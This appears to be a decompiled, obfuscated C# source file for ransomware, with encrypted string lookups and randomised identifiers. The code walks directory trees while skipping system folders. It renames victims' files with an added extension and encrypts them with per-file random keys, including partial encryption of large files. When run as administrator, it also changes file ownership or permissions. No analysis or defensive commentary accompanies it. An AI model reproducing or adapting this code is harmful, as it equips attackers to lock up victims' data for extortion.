using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using QFyaHqhDqlrj;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using XEThkAUKbjVOBg;

namespace EJhaxGWLzpBbb;

internal sealed class hiKoLLubGHH
{
	public sealed class btVBxWBDGMu
	{
		private static StringCollection miGOFbbNFLifVEx;

		private static List<string> brTwWAgcshMRi;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107199632));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107199627)) && !text.ToLower().Contains(getString_0(107200086)) && !text.ToLower().Contains(getString_0(107088034)) && !text.ToLower().Contains(getString_0(107087989)) && !text.ToLower().Contains(getString_0(107200105)) && !text.ToLower().Contains(getString_0(107088349)) && !text.ToLower().Contains(getString_0(107088322)) && !text.ToLower().Contains(getString_0(107088305)) && !text.ToLower().Contains(getString_0(107088256)) && !text.ToLower().Contains(getString_0(107088271)) && !text.ToLower().Contains(getString_0(107087725)) && !text.ToLower().Contains(getString_0(107087676)) && !text.ToLower().Contains(getString_0(107087691)) && !text.ToLower().Contains(getString_0(107087646)) && !text.ToLower().Contains(getString_0(107087657)) && !text.ToLower().Contains(getString_0(107087612)) && !text.ToLower().Contains(getString_0(107087631)) && !text.ToLower().Contains(getString_0(107087582)) && !text.ToLower().Contains(getString_0(107087597)) && !text.Contains(ZszvXPTYjBtgjF(getString_0(107087548))) && !text.Contains(getString_0(107087555)) && !text.Contains(getString_0(107087525)) && !text.EndsWith(getString_0(107411948)) && !text.EndsWith(getString_0(107087500)) && !text.EndsWith(getString_0(107087495)) && !text.EndsWith(getString_0(107087490)) && !text.EndsWith(getString_0(107087965)) && !text.ToLower().Contains(getString_0(107087960)) && !text.ToLower().Contains(kkipsSsrGYdH))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(pDpPfpDBIveZcfZ) * 1024.0 * 1024.0 && OAyGmagMWpgoWAJCw == getString_0(107396912))
							{
								brTwWAgcshMRi.Add(text);
							}
							else if (File.Exists(text) && OAyGmagMWpgoWAJCw == getString_0(107396885))
							{
								brTwWAgcshMRi.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return brTwWAgcshMRi;
		}

		static btVBxWBDGMu()
		{
			Strings.CreateGetStringDelegate(typeof(btVBxWBDGMu));
			miGOFbbNFLifVEx = new StringCollection();
			brTwWAgcshMRi = new List<string>();
		}
	}

	private sealed class TwAzFXVMJYssEnB
	{
		public string PJmKEXqsFYiTo;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == PJmKEXqsFYiTo;
		}
	}

	private sealed class coqMoxQsOKsNww
	{
		public string YebcbRJTLVZ;

		public bool _003CIsDriveNTFS_003Eb__1c(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == YebcbRJTLVZ;
		}
	}

	private sealed class opEUSGhekibpe
	{
		private sealed class PPgvMtINLRXZ
		{
			public opEUSGhekibpe XXNBoOrvVI;

			public string CmApvDsTkVQdDmOKbq;

			public void _003CCrypt_003Eb__22()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					VxPVaVfBRTNH(WindowsIdentity.GetCurrent().Name, CmApvDsTkVQdDmOKbq);
				}
			}

			public void _003CCrypt_003Eb__23()
			{
				SIFiImBWwIXLvUKR(CmApvDsTkVQdDmOKbq, XXNBoOrvVI.uOkhpLshTyLnajomxA, XXNBoOrvVI.eFBbXqCzejjfa, XXNBoOrvVI.NrlUsEOMHlLHF, XXNBoOrvVI.sJSNFTDCiAYGw);
			}
		}

		public string[] uOkhpLshTyLnajomxA;

		public string[] NrlUsEOMHlLHF;

		public string sJSNFTDCiAYGw;

		public string eFBbXqCzejjfa;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__21(string string_0)
		{
			PPgvMtINLRXZ CS_0024_003C_003E8__locals0 = new PPgvMtINLRXZ();
			CS_0024_003C_003E8__locals0.XXNBoOrvVI = this;
			CS_0024_003C_003E8__locals0.CmApvDsTkVQdDmOKbq = string_0;
			if (gEajYrRefTMmPd && !aDRTZBCTUt().Contains(getString_0(107116691)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						VxPVaVfBRTNH(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.CmApvDsTkVQdDmOKbq);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (HjogaXQARCSKCJ == getString_0(107396919))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					SIFiImBWwIXLvUKR(CS_0024_003C_003E8__locals0.CmApvDsTkVQdDmOKbq, CS_0024_003C_003E8__locals0.XXNBoOrvVI.uOkhpLshTyLnajomxA, CS_0024_003C_003E8__locals0.XXNBoOrvVI.eFBbXqCzejjfa, CS_0024_003C_003E8__locals0.XXNBoOrvVI.NrlUsEOMHlLHF, CS_0024_003C_003E8__locals0.XXNBoOrvVI.sJSNFTDCiAYGw);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				SIFiImBWwIXLvUKR(CS_0024_003C_003E8__locals0.CmApvDsTkVQdDmOKbq, uOkhpLshTyLnajomxA, eFBbXqCzejjfa, NrlUsEOMHlLHF, sJSNFTDCiAYGw);
			}
		}

		static opEUSGhekibpe()
		{
			Strings.CreateGetStringDelegate(typeof(opEUSGhekibpe));
		}
	}

	private sealed class TxvmYnegcEEXP
	{
		private sealed class jLsWkoDNXB
		{
			public TxvmYnegcEEXP cuOejHWGxARa;

			public string swqZlkLBjRbZRI;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2f()
			{
				foreach (string item in RrzUCivKfrsaJ)
				{
					if (swqZlkLBjRbZRI.ToLower().EndsWith(item + cuOejHWGxARa.smwDoAVKEY) && ARdYTzaLyCQej == getString_0(107396930))
					{
						if (Convert.ToInt32(zxDCvygXmLZs) * 1024 * 1024 > new FileInfo(swqZlkLBjRbZRI).Length)
						{
							try
							{
								GtRYKNkRmbf.WWRIlNqXKavKj(getString_0(107089469), getString_0(107089464), getString_0(107089419), swqZlkLBjRbZRI);
							}
							catch
							{
							}
						}
					}
					else if (swqZlkLBjRbZRI.ToLower().EndsWith(item) && ARdYTzaLyCQej == getString_0(107396903))
					{
						try
						{
							GtRYKNkRmbf.WWRIlNqXKavKj(getString_0(107089469), getString_0(107089464), getString_0(107089419), swqZlkLBjRbZRI);
						}
						catch
						{
						}
					}
				}
			}

			static jLsWkoDNXB()
			{
				Strings.CreateGetStringDelegate(typeof(jLsWkoDNXB));
			}
		}

		private sealed class pFmMbBUFsGam
		{
			public TxvmYnegcEEXP cuOejHWGxARa;

			public string uPbVWEenEqRDPeByt;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__31()
			{
				foreach (string item in RrzUCivKfrsaJ)
				{
					if (uPbVWEenEqRDPeByt.ToLower().EndsWith(item + cuOejHWGxARa.smwDoAVKEY) && ARdYTzaLyCQej == getString_0(107396933))
					{
						if (Convert.ToInt32(zxDCvygXmLZs) * 1024 * 1024 > new FileInfo(uPbVWEenEqRDPeByt).Length)
						{
							try
							{
								GtRYKNkRmbf.WWRIlNqXKavKj(getString_0(107089472), getString_0(107089467), getString_0(107089422), uPbVWEenEqRDPeByt);
							}
							catch
							{
							}
						}
					}
					else if (uPbVWEenEqRDPeByt.ToLower().EndsWith(item) && ARdYTzaLyCQej == getString_0(107396906))
					{
						try
						{
							GtRYKNkRmbf.WWRIlNqXKavKj(getString_0(107089472), getString_0(107089467), getString_0(107089422), uPbVWEenEqRDPeByt);
						}
						catch
						{
						}
					}
				}
			}

			static pFmMbBUFsGam()
			{
				Strings.CreateGetStringDelegate(typeof(pFmMbBUFsGam));
			}
		}

		public List<string> GjQUDYPqDPYd;

		public List<string> NkwuoikPHxefPg;

		public string smwDoAVKEY;

		public string[] JLhEdrGQmnkgx;

		public string zlRieKkFzeh;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2e(string string_0)
		{
			jLsWkoDNXB CS_0024_003C_003E8__locals0;
			foreach (string item in NkwuoikPHxefPg)
			{
				if (item.Contains(getString_0(107088124)) || item.Contains(getString_0(107088067)) || item.Contains(getString_0(107088034)) || item.ToLower().Contains(getString_0(107088049)) || item.ToLower().Contains(getString_0(107088004)) || item.Contains(getString_0(107088491)) || item.Contains(getString_0(107088502)) || item.ToLower().Contains(getString_0(107088453)) || item.ToLower().Contains(getString_0(107088472)) || item.ToLower().Contains(getString_0(107088435)) || item.ToLower().Contains(getString_0(107088394)) || item.ToLower().Contains(getString_0(107088409)) || item.ToLower().Contains(getString_0(107088383)) || item.ToLower().Contains(getString_0(107088330)) || item.Contains(getString_0(107088337)) || item.Contains(getString_0(107088320)) || item.Contains(getString_0(107088271)) || item.Contains(getString_0(107088286)) || item.Contains(getString_0(107087725)) || item.Contains(getString_0(107087740)) || item.Contains(getString_0(107087691)) || item.Contains(getString_0(107087706)) || item.Contains(getString_0(107087661)) || item.Contains(getString_0(107087672)) || item.ToLower().Contains(getString_0(107087627)) || item.ToLower().Contains(getString_0(107087646)) || item.ToLower().Contains(getString_0(107087597)) || item.ToLower().Contains(getString_0(107087612)) || item.Contains(ZszvXPTYjBtgjF(getString_0(107087563))) || item.Contains(getString_0(107087570)) || item.Contains(getString_0(107087525)) || item.Contains(getString_0(107087540)) || item.EndsWith(smwDoAVKEY) || item.EndsWith(getString_0(107087515)) || item.EndsWith(getString_0(107087510)) || item.EndsWith(getString_0(107087505)) || item.EndsWith(getString_0(107087980)) || item.Contains(getString_0(107087975)) || item.Contains(kkipsSsrGYdH) || item.Contains(YPtXSOBdFjEyjx) || item.Contains(wtdIqahxTNLZTaxN))
				{
					continue;
				}
				if (JLhEdrGQmnkgx.Length != 0)
				{
					string[] jLhEdrGQmnkgx = JLhEdrGQmnkgx;
					int num = 0;
					while (num < jLhEdrGQmnkgx.Length)
					{
						string value = jLhEdrGQmnkgx[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0bd3;
					}
				}
				try
				{
					if (item.EndsWith(smwDoAVKEY))
					{
						goto IL_0bd3;
					}
				}
				catch (Exception)
				{
					goto IL_0bd3;
				}
				if (!item.EndsWith(string_0) || iqVERQUhagNsiaC.Contains(item))
				{
					continue;
				}
				if (gZQfvzYpbFm == getString_0(107396927))
				{
					try
					{
						if (LKzunSqPvQl.OqOYRyhEkO(item))
						{
							LKzunSqPvQl.jdGybWbavTdA(item);
						}
					}
					catch
					{
					}
				}
				iqVERQUhagNsiaC.Add(item);
				if (!LJCJcQbJapSHJR.Contains(Path.GetDirectoryName(item)))
				{
					LJCJcQbJapSHJR.Add(Path.GetDirectoryName(item));
				}
				bvXmiHFimEQvc(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (WUCUbinjeq)
						{
							try
							{
								File.AppendAllText(YPtXSOBdFjEyjx, getString_0(107116801) + item + getString_0(107200071) + ex2.Message + getString_0(107396273));
							}
							catch (Exception)
							{
							}
						}
						uKBVRzIpOhGoBvvo++;
						goto end_IL_0537;
					}
					if (mDoYpgRrDTVMHT == getString_0(107396927) && new FileInfo(item).Length > Convert.ToInt32(lpATBSWKaW) * 1024 * 1024 && !GjQUDYPqDPYd.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new jLsWkoDNXB();
						CS_0024_003C_003E8__locals0.cuOejHWGxARa = this;
						try
						{
							if (smwDoAVKEY != getString_0(107117071))
							{
								if (SWTAoziGpJs)
								{
									smwDoAVKEY = oADcMioEnFbvkP + smwDoAVKEY;
								}
								File.Move(item, item + smwDoAVKEY);
							}
						}
						catch (Exception ex4)
						{
							if (WUCUbinjeq)
							{
								try
								{
									File.AppendAllText(YPtXSOBdFjEyjx, getString_0(107116801) + item + getString_0(107200010) + ex4.Message + getString_0(107396273));
								}
								catch (Exception)
								{
								}
							}
							uKBVRzIpOhGoBvvo++;
							goto end_IL_0537;
						}
						CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI = getString_0(107087990);
						if (smwDoAVKEY != getString_0(107117071))
						{
							CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI = item + smwDoAVKEY;
						}
						else
						{
							CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI = item;
						}
						if (pAvlEUMGUOUVcdb == getString_0(107396927))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in RrzUCivKfrsaJ)
								{
									if (CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.cuOejHWGxARa.smwDoAVKEY) && ARdYTzaLyCQej == jLsWkoDNXB.getString_0(107396930))
									{
										if (Convert.ToInt32(zxDCvygXmLZs) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI).Length)
										{
											try
											{
												GtRYKNkRmbf.WWRIlNqXKavKj(jLsWkoDNXB.getString_0(107089469), jLsWkoDNXB.getString_0(107089464), jLsWkoDNXB.getString_0(107089419), CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI.ToLower().EndsWith(item2) && ARdYTzaLyCQej == jLsWkoDNXB.getString_0(107396903))
									{
										try
										{
											GtRYKNkRmbf.WWRIlNqXKavKj(jLsWkoDNXB.getString_0(107089469), jLsWkoDNXB.getString_0(107089464), jLsWkoDNXB.getString_0(107089419), CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = NZopcmHTCiMQzV.uWnqKeXVtnZBRi(32);
						string s = JsvGUDXDxegb.IZZvLHDYDcwVFv(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (POQJbfIxsobkq == getString_0(107396900))
						{
							byte[] array = null;
							byte[] byte_ = UMakmguwDziAz.DfejPHmIhOnY(CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI, Convert.ToInt32(lpATBSWKaW) * 1024 * 1024);
							UMakmguwDziAz.nkwBxgmWNRASp(fWRwXzgCAjjaTG: (!qZXDIsTpDUXR) ? (kzxgomJEqSw ? UMakmguwDziAz.YfzRuKIVSlIggFhc(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : UMakmguwDziAz.YfzRuKIVSlIggFhc(byte_, Encoding.ASCII.GetBytes(zlRieKkFzeh), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (kzxgomJEqSw ? lvPnQGmwQvcsCNgQ.RRycjAChOoCA(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : lvPnQGmwQvcsCNgQ.RRycjAChOoCA(byte_, Encoding.ASCII.GetBytes(zlRieKkFzeh), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), sNrLziMcVOrPcU: CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI, afrhZVQdJhNaNnw: bytes);
						}
						else if (!kzxgomJEqSw)
						{
							fUfTmnKzHcpx.epfACCRTlqVGS(CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI, lpATBSWKaW, zlRieKkFzeh);
						}
						else
						{
							fUfTmnKzHcpx.epfACCRTlqVGS(CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI, lpATBSWKaW, text, bytes);
						}
					}
					else
					{
						if (SWTAoziGpJs)
						{
							smwDoAVKEY = oADcMioEnFbvkP + smwDoAVKEY;
						}
						string text2 = NZopcmHTCiMQzV.uWnqKeXVtnZBRi(32);
						string s2 = JsvGUDXDxegb.IZZvLHDYDcwVFv(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (smwDoAVKEY != getString_0(107117071))
						{
							if (!tJrulPsPKZ)
							{
								if (!kzxgomJEqSw)
								{
									NvWUfuaAWdwvhRC(item, item + smwDoAVKEY, cIuCDrbwXuOW);
								}
								else
								{
									NvWUfuaAWdwvhRC(item, item + smwDoAVKEY, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!kzxgomJEqSw)
									{
										kJPieacjYGSQl(item, item + smwDoAVKEY, cIuCDrbwXuOW);
									}
									else
									{
										kJPieacjYGSQl(item, item + smwDoAVKEY, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (WUCUbinjeq)
									{
										try
										{
											File.AppendAllText(YPtXSOBdFjEyjx, getString_0(107116801) + item + getString_0(107117057) + ex6.Message + getString_0(107396273));
										}
										catch (Exception)
										{
										}
									}
									uKBVRzIpOhGoBvvo++;
									goto end_IL_0537;
								}
							}
						}
						else if (!tJrulPsPKZ)
						{
							if (!kzxgomJEqSw)
							{
								NvWUfuaAWdwvhRC(item, item + getString_0(107117066), cIuCDrbwXuOW);
							}
							else
							{
								NvWUfuaAWdwvhRC(item, item + getString_0(107117066), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!kzxgomJEqSw)
								{
									kJPieacjYGSQl(item, item, cIuCDrbwXuOW);
								}
								else
								{
									kJPieacjYGSQl(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (WUCUbinjeq)
								{
									try
									{
										File.AppendAllText(YPtXSOBdFjEyjx, getString_0(107116801) + item + getString_0(107117057) + ex8.Message + getString_0(107396273));
									}
									catch (Exception)
									{
									}
								}
								uKBVRzIpOhGoBvvo++;
								goto end_IL_0537;
							}
						}
						if (kzxgomJEqSw)
						{
							if (smwDoAVKEY != getString_0(107117071))
							{
								cSThTETOguBcBoOS(item + smwDoAVKEY, bytes2);
							}
							else
							{
								cSThTETOguBcBoOS(item, bytes2);
							}
						}
					}
					goto IL_0bd3;
					end_IL_0537:;
				}
				catch (Exception)
				{
					goto IL_0bd3;
				}
				continue;
				IL_0bd3:
				NkwuoikPHxefPg.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__30(string string_0)
		{
			pFmMbBUFsGam CS_0024_003C_003E8__locals0 = new pFmMbBUFsGam();
			CS_0024_003C_003E8__locals0.cuOejHWGxARa = this;
			CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt = string_0;
			if (!CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107088124)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107088067)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107088034)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(getString_0(107088049)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(getString_0(107088004)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107088491)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107088502)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(getString_0(107088453)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(getString_0(107088472)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(getString_0(107088435)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(getString_0(107088394)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(getString_0(107088409)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(getString_0(107088383)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(getString_0(107088330)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107088337)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107088320)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107088271)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107088286)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107087725)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107087740)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107087691)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107087706)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107087661)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107087672)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(getString_0(107087627)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(getString_0(107087646)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(getString_0(107087597)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(getString_0(107087612)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(ZszvXPTYjBtgjF(getString_0(107087563))) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107087570)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107087525)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107087540)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.EndsWith(smwDoAVKEY) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.EndsWith(getString_0(107087515)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.EndsWith(getString_0(107087510)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.EndsWith(getString_0(107087505)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.EndsWith(getString_0(107087980)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(getString_0(107087975)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(kkipsSsrGYdH) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(YPtXSOBdFjEyjx) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(wtdIqahxTNLZTaxN))
			{
				if (JLhEdrGQmnkgx.Length != 0)
				{
					string[] jLhEdrGQmnkgx = JLhEdrGQmnkgx;
					int num = 0;
					while (num < jLhEdrGQmnkgx.Length)
					{
						string value = jLhEdrGQmnkgx[num];
						if (!CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0d56;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.EndsWith(smwDoAVKEY))
					{
						goto IL_0d56;
					}
				}
				catch (Exception)
				{
					goto IL_0d56;
				}
				if (!iqVERQUhagNsiaC.Contains(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt))
				{
					if (gZQfvzYpbFm == getString_0(107396927))
					{
						try
						{
							if (LKzunSqPvQl.OqOYRyhEkO(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt))
							{
								LKzunSqPvQl.jdGybWbavTdA(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt);
							}
						}
						catch
						{
						}
					}
					iqVERQUhagNsiaC.Add(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt);
					if (!LJCJcQbJapSHJR.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt)))
					{
						LJCJcQbJapSHJR.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt));
					}
					bvXmiHFimEQvc(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt);
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt).Length != 0L)
							{
								goto end_IL_0656;
							}
							goto end_IL_0656_2;
							end_IL_0656:;
						}
						catch (Exception ex2)
						{
							if (WUCUbinjeq)
							{
								try
								{
									File.AppendAllText(YPtXSOBdFjEyjx, getString_0(107116801) + CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + getString_0(107200071) + ex2.Message + getString_0(107396273));
								}
								catch (Exception)
								{
								}
							}
							uKBVRzIpOhGoBvvo++;
							goto end_IL_0656_2;
						}
						if (mDoYpgRrDTVMHT == getString_0(107396927) && new FileInfo(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt).Length > Convert.ToInt32(lpATBSWKaW) * 1024 * 1024)
						{
							try
							{
								if (smwDoAVKEY != getString_0(107117071))
								{
									if (SWTAoziGpJs)
									{
										smwDoAVKEY = oADcMioEnFbvkP + smwDoAVKEY;
									}
									File.Move(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + smwDoAVKEY);
								}
							}
							catch (Exception ex4)
							{
								if (WUCUbinjeq)
								{
									try
									{
										File.AppendAllText(YPtXSOBdFjEyjx, getString_0(107116801) + CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + getString_0(107200010) + ex4.Message + getString_0(107396273));
									}
									catch (Exception)
									{
									}
								}
								uKBVRzIpOhGoBvvo++;
								return;
							}
							if (smwDoAVKEY != getString_0(107117071))
							{
								CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt += smwDoAVKEY;
							}
							if (pAvlEUMGUOUVcdb == getString_0(107396927))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in RrzUCivKfrsaJ)
									{
										if (CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.cuOejHWGxARa.smwDoAVKEY) && ARdYTzaLyCQej == pFmMbBUFsGam.getString_0(107396933))
										{
											if (Convert.ToInt32(zxDCvygXmLZs) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt).Length)
											{
												try
												{
													GtRYKNkRmbf.WWRIlNqXKavKj(pFmMbBUFsGam.getString_0(107089472), pFmMbBUFsGam.getString_0(107089467), pFmMbBUFsGam.getString_0(107089422), CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().EndsWith(item) && ARdYTzaLyCQej == pFmMbBUFsGam.getString_0(107396906))
										{
											try
											{
												GtRYKNkRmbf.WWRIlNqXKavKj(pFmMbBUFsGam.getString_0(107089472), pFmMbBUFsGam.getString_0(107089467), pFmMbBUFsGam.getString_0(107089422), CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = NZopcmHTCiMQzV.uWnqKeXVtnZBRi(32);
							string s = JsvGUDXDxegb.IZZvLHDYDcwVFv(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (POQJbfIxsobkq == getString_0(107396900))
							{
								byte[] array = null;
								byte[] byte_ = UMakmguwDziAz.DfejPHmIhOnY(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, Convert.ToInt32(lpATBSWKaW) * 1024 * 1024);
